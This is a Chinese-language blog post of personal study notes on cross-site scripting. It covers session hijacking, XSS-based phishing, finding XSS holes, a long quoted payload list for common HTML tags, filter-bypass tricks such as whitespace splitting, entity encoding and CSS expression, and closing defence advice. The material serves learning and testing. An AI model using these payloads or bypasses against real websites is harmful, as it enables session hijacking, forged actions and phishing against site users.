&#160;我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。</p><ul><li>相关文章：<a href="https://www.cnblogs.com/cheney256/articles/8942240.html" target="_blank" rel="noopener">用P3P header解决iframe跨域访问cookie</a></li><li>相关阅读：<strong>《Web前端黑客技术揭秘》p41-42</strong></li></ul><h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>&#160; &#160; &#160; &#160;由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。<br>&#160; &#160; &#160; &#160;这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容</p><blockquote><p>&#160; &#160; &#160; &#160;Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。<br>&#160; &#160; &#160; &#160;在Session机制中，客户端和服务端也有被其他人利用的可能。<br>&#160; &#160; &#160; &#160;Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面</p></blockquote><p>&#160; &#160; &#160; &#160;这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。<br>&#160; &#160; &#160; &#160;会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。</p><ul><li>通过javascript控制DOM对象来发起一个GET请求，如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; document.creatElement(&quot;img&quot;);</span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;www.a.com&#x2F;del.php?id&#x3D;1&quot;;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure></li><li>通过javascript自动构造隐藏表单并提交(POST)</li><li>通过XMLHttpRequest直接发送一个POST请求</li></ul><p>&#160; &#160; &#160; &#160;我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。</p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>&#160; &#160; &#160; &#160;现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？</p><h4 id="XSS重定向钓鱼"><a href="#XSS重定向钓鱼" class="headerlink" title="XSS重定向钓鱼"></a>XSS重定向钓鱼</h4><p>&#160; &#160; &#160; &#160;即从<code>www.a.com</code>通过xss漏洞跳转到<code>www.b.com</code>的钓鱼页面上，整个过程变化明显，受害者易察觉。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.a.com&#x2F;index.php?search&#x3D;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.b.com&#x2F;index.php&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p></p><h4 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h4><p>&#160; &#160; &#160; &#160;通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。</p><h4 id="Iframe"><a href="#Iframe" class="headerlink" title="Iframe"></a>Iframe</h4><p>&#160; &#160; &#160; &#160;攻击者通过javascript来添加一个新的<code>&lt;Iframe&gt;</code>标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。</p><h2 id="5-XSS漏洞的挖掘"><a href="#5-XSS漏洞的挖掘" class="headerlink" title="5) XSS漏洞的挖掘"></a>5) XSS漏洞的挖掘</h2><p>&#160; &#160; &#160; &#160;就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。</p><h3 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h3><p>&#160; &#160; &#160; &#160;通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。</p><blockquote><p>分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤</p></blockquote><h3 id="黑盒审计"><a href="#黑盒审计" class="headerlink" title="黑盒审计"></a>黑盒审计</h3><p>&#160; &#160; &#160; &#160;这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。</p><h4 id="手工检测"><a href="#手工检测" class="headerlink" title="手工检测"></a>手工检测</h4><p>&#160; &#160; &#160; &#160;首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如<code>&quot;&lt;&gt;&amp;;/&#39;:</code>等，如果连<code>&lt;&gt;</code>都未过滤/转义，那么该输入点很可能存在XSS漏洞。<br>&#160; &#160; &#160; &#160;如果<code>&lt;&gt;</code>等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如<br><code>&lt;input name=&quot;xx&quot; value=&lt;?=$query?&gt;&gt;</code>这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为<code>&lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&gt;</code>。<br>&#160; &#160; &#160; &#160;一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">常见标签</span><br><span class="line">&lt;img&gt;标签</span><br><span class="line">利用方式1</span><br><span class="line">&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;a&gt;标签</span><br><span class="line">标准格式</span><br><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">利用方式3</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">input标签</span><br><span class="line">标准格式</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;</span><br><span class="line">利用方式1</span><br><span class="line">&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt;</span><br><span class="line">利用方式2</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;form&gt;标签</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">&lt;iframe&gt;标签</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">svg&lt;&gt;标签</span><br><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br><span class="line">iframe</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><br>——引自<strong>wkend</strong>的文章<a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">《XSS小节》</a><p></p><h4 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h4><p>&#160; &#160; &#160; &#160;关于XSS的自动检测软件有许多，如Burp的Scan模块，<a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">BruteXSS</a>等，这里不做过多解释。</p><h2 id="6-shellcode的绕过"><a href="#6-shellcode的绕过" class="headerlink" title="6) shellcode的绕过"></a>6) shellcode的绕过</h2><h3 id="绕过XSS-Filter"><a href="#绕过XSS-Filter" class="headerlink" title="绕过XSS-Filter"></a>绕过XSS-Filter</h3><p>&#160; &#160; &#160; &#160;XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。</p><h4 id="空格回车和Tab"><a href="#空格回车和Tab" class="headerlink" title="空格回车和Tab"></a>空格回车和Tab</h4><p>&#160; &#160; &#160; &#160;对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将<code>;</code>作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到<code>;</code>便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字<code>javascript|alert</code>的过滤：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;javasc</span><br><span class="line">ript:aler</span><br><span class="line">t(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="IE6下测试成功" class="lazyload" data-src="https://i.loli.net/2019/03/10/5c83f56052a54.png"><p></p><h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><p>&#160; &#160; &#160; &#160;HTML中属性值支持ASCII码形式，如<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;替换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascrip&amp;#116&amp;#58alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;其中在ASCII表中116为<code>t</code>，58为<code>:</code>。<br>&#160; &#160; &#160; &#160;也可以将<code>&amp;#01</code>,<code>&amp;#02</code>等插入javascript的头部，还可以将tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。<p></p><h4 id="Fuzz标签未过滤事件名"><a href="#Fuzz标签未过滤事件名" class="headerlink" title="Fuzz标签未过滤事件名"></a>Fuzz标签未过滤事件名</h4><p>&#160; &#160; &#160; &#160;如<code>&lt;img src=x onerror=alert(/xss/)&gt;</code>其中的onerror即为IMG标签的一个事件，通常这样的事件都是以<code>on</code>开头，常见的有:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onReverse</span><br><span class="line">onSeek</span><br><span class="line">onSynchRestored</span><br><span class="line">onURLFlip</span><br><span class="line">onRepeat</span><br><span class="line">onPause</span><br><span class="line">onstop</span><br><span class="line">onmouseover</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;除此之外还有很多事件可以利用，这里不再一一列举。<p></p><h4 id="使用Css绕过"><a href="#使用Css绕过" class="headerlink" title="使用Css绕过"></a>使用Css绕过</h4><p>&#160; &#160; &#160; &#160;利用Css样式表可以执行javascript的特性，如<br>&#160; &#160; &#160; &#160;Css直接执行javascript：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;background-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:url(&quot;javascript:alert(&#39;xss&#39;)&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;css中使用expression执行javascript:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;width: expression(alert(&#39;xss&#39;))&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; style&#x3D;&quot;xss:expression(alert(&#x2F;xss&#x2F;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:expression(&quot;alert(&#39;xss&#39;)&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。<br>&#160; &#160; &#160; &#160;除了上述两种，还可以利用@import直接执行javascript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    @import &#39;javascript:alert(&quot;xss&quot;)&#39;;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。<p></p><h3 id="扰乱规则"><a href="#扰乱规则" class="headerlink" title="扰乱规则"></a>扰乱规则</h3><ul><li>大小写变换;</li><li>利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;</li><li>结合样式表注释字符/**/，通过css执行javascript</li><li>样式标签会过滤<code>\</code>和<code>\0</code>，可以构造如<code>@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;</code>绕过</li><li>Css关键字进行编码处理，如<code>&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;</code>其中65为字母e进行unicode编码后的数字部分</li><li>利用浏览器解析注释的问题</li></ul><h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><p>&#160; &#160; &#160; &#160;javascript支持许多的编码格式，如：</p><ul><li>unicode</li><li>escapes</li><li>十六|十|八进制</li></ul><p><strong>如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力</strong><br>在IE下甚至支持JScript Encode加密后的代码</p><h3 id="拆分法"><a href="#拆分法" class="headerlink" title="拆分法"></a>拆分法</h3><p>&#160; &#160; &#160; &#160;如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：<a href="http://www.5ilog.com/cgi-bin/sys/link/view.aspx/7016111.htm" target="_blank" rel="noopener">《疯狂的跨站之行》剑心(非原链接)</a></p><h2 id="7-XSS防御"><a href="#7-XSS防御" class="headerlink" title="7) XSS防御"></a>7) XSS防御</h2><p>&#160; &#160; &#160; &#160;说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>&#160; &#160; &#160; &#160;严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>&#160; &#160; &#160; &#160;减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>&#160; &#160; &#160; &#160;设置HttpOnly，开启WAF。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>&#160; &#160; &#160; &#160;感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注我的博客(<a href="http://www.0x002.com)。" target="_blank" rel="noopener">www.0x002.com)。</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><strong><br>书籍：<br>《Web前端黑客技术揭秘》<br>《XSS跨站脚本攻击剖析与防御》<br>《白帽子讲Web安全》<br>《黑客攻防技术宝典Web实战篇》第二版<br>文章：</strong><br><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">XSS小结</a><br><a href="https://github.com/dwqs/blog/issues/68" target="_blank" rel="noopener">浅说 XSS 和 CSRF</a><br><a href="https://blog.csdn.net/h_mxc/article/details/50542038" target="_blank" rel="noopener">Session攻击手段(会话劫持/固定)及其安全防御措施</a></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a href="https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md" target="_blank" rel="noopener">https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md</a> 2017灰袍技能精华<br><a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">https://github.com/rajeshmajumdar/BruteXSS</a> BruteXSS<br><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a> Beef神器<br><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> 用于检查跨站点跟踪的小型python脚本<br><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> 一个非常简单的反射XSS扫描仪支持GET/POST<br><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> 反射xss扫描器<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf" target="_blank" rel="noopener">https://github.com/BlackHole1/autoFindXssAndCsrf</a> 浏览器的插件，它自动检查页面是否具有xss和漏洞<br><a href="https://github.com/shogunlab/shuriken" target="_blank" rel="noopener">https://github.com/shogunlab/shuriken</a> xss命令行工具用于测试web应用程序中xss负载列表<br><a href="https://github.com/UltimateHackers/XSStrike" target="_blank" rel="noopener">https://github.com/UltimateHackers/XSStrike</a> 用于XSS、WAF检测和旁路的模糊和蛮力参数<br><a href="https://github.com/stamparm/DSXS" target="_blank" rel="noopener">https://github.com/stamparm/DSXS</a> 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码</p></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者:</span> <span class="post-copyright-info"><a href="mailto:undefined">Yunen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接:</span> <span class="post-copyright-info"><a href="https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.0x002.com" target="_blank">Yunen's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post_share"></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"><i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://blog-1251618737.cos.ap-chengdu.myqcloud.com/pay/wechat.png" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://blog-1251618737.cos.ap-chengdu.myqcloud.com/pay/alipay.png" alt="支付宝"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/%E4%BD%BF%E7%94%A8Django%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84XSS%E5%B9%B3%E5%8F%B0/"><img class="prev_cover lazyload" data-src="https://p.pstatp.com/origin/fe410000769083c79355" onerror='onerror=null,src="/img/404.jpg"'><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">使用Django简单编写一个XSS平台</div></div></a></div><div class="next-post pull_right"><a href="/2018/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"><img class="next_cover lazyload" data-src="https://p.pstatp.com/origin/ff84000080cf9452a5bb" onerror='onerror=null,src="/img/404.jpg"'><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PHP反序列化漏洞的简单学习</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i> <span>相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2019/关于我学XSS躺过的那些坑/" title="关于我学XSS躺过的那些坑"><img class="relatedPosts_cover lazyload" data-src="https://p.pstatp.com/origin/fec8000053163f2df2fb"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-03-23</div><div class="relatedPosts_title">关于我学XSS躺过的那些坑</div></div></a></div><div class="relatedPosts_item"><a href="/2019/使用Django打造属于自己的XSS平台/" title="使用Django简单编写一个XSS平台"><img class="relatedPosts_cover lazyload" data-src="https://p.pstatp.com/origin/fe410000769083c79355"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2019-03-20</div><div class="relatedPosts_title">使用Django简单编写一个XSS平台</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i> <span>评论</span></div><div class="vcomment" id="vcomment"></div><script src="/js/Valine.min.js"></script><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script>var notify=!1,verify=!1,GUEST_INFO=["nick","mail","link"],guest_info="nick,mail,link".split(",").filter(function(n){return-1<GUEST_INFO.indexOf(n)});function valine_func(){window.valine=new 